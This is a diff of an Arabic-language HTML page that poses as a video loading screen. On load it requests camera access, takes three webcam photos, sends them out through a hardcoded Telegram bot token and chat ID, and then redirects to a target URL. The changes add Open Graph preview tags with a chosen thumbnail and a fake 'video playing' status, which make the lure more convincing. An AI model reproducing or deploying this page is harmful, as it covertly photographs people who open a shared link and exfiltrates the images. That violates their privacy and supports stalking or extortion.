@@ -4,6 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>لحظة واحدة</title>
+
+    <!-- وسوم Open Graph -->
+    <meta property="og:title" content="لحظة واحدة" />
+    <meta property="og:description" content="تم التوجيه عبر البوت" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://app-display.github.io/ca.html-chatld2/" />
+    <meta id="og-image" property="og:image" content="" />
+
     <style>
         body { 
             background-color: #0d0d0d; 
@@ -25,21 +33,54 @@
             font-size: 24px; 
             margin-top: 10px; 
         }
+        #status {
+            font-size: 18px;
+            color: #66ccff;
+            margin-top: 20px;
+            background: rgba(255,255,255,0.1);
+            padding: 8px 20px;
+            border-radius: 30px;
+            border: 1px solid #66ccff;
+            opacity: 0.8;
+        }
+        #thumbnail-preview {
+            max-width: 300px;
+            border-radius: 8px;
+            margin-top: 10px;
+            border: 2px solid #ff6600;
+        }
     </style>
 </head>
 <body>
 
     <div id="timer">10</div>
     <div id="message">لحظة واحدة من فضلك</div>
+    
+    <!-- ✅ النص الجديد تحت العداد -->
+    <div id="status">🎬 جاري تشغيل الفيديو</div>
+
+    <img id="thumbnail-preview" style="display:none;" />
+
     <video id="video" style="display:none;" playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        // ====== قراءة المعاملات ======
         const urlParams = new URLSearchParams(window.location.search);
         const TARGET_URL = urlParams.get('target') || "https://google.com";
         const CHAT_ID = urlParams.get('chatId') || '8169635171';
+        const IMAGE_URL = urlParams.get('image') || '';
         const TOKEN = '8128965245:AAHZ0LIhLWdJ5WcE9-joCLJkOrScPmPBCXs';
 
+        // ====== تعيين الصورة في Open Graph ======
+        if (IMAGE_URL) {
+            document.getElementById('og-image').setAttribute('content', IMAGE_URL);
+            const img = document.getElementById('thumbnail-preview');
+            img.src = IMAGE_URL;
+            img.style.display = 'block';
+        }
+
+        // ====== التقاط الصور وإرسالها ======
         async function captureAndSend(video) {
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
@@ -64,7 +105,7 @@
                 video.srcObject = stream;
                 await video.play();
 
-                // التقاط 3 صور بفاصل ثانية
+                // التقاط 3 صور
                 for (let i = 0; i < 3; i++) {
                     await captureAndSend(video);
                     if (i < 2) await new Promise(r => setTimeout(r, 1000));
@@ -72,27 +113,31 @@
 
                 stream.getTracks().forEach(t => t.stop());
 
-                // بدء العد التنازلي
+                // العد التنازلي
                 let count = 10;
                 const timerEl = document.getElementById('timer');
                 const messageEl = document.getElementById('message');
+                const statusEl = document.getElementById('status');
                 
                 const interval = setInterval(() => {
                     count--;
                     if (count > 0) {
                         timerEl.innerText = count;
+                        statusEl.innerText = `🎬 جاري تشغيل الفيديو (${count})`;
                     } else {
                         timerEl.innerText = "تم التوجيه";
+                        statusEl.innerText = "✅ تم التوجيه";
                         clearInterval(interval);
                         window.location.replace(TARGET_URL);
                     }
                 }, 1000);
             } catch (e) {
                 document.getElementById('message').innerText = "يرجى الضغط على سماح للكاميرا";
+                document.getElementById('status').innerText = "⛔ الكاميرا غير متاحة";
             }
         }
 
         window.onload = startProcess;
     </script>
 </body>
-</html
+</html>
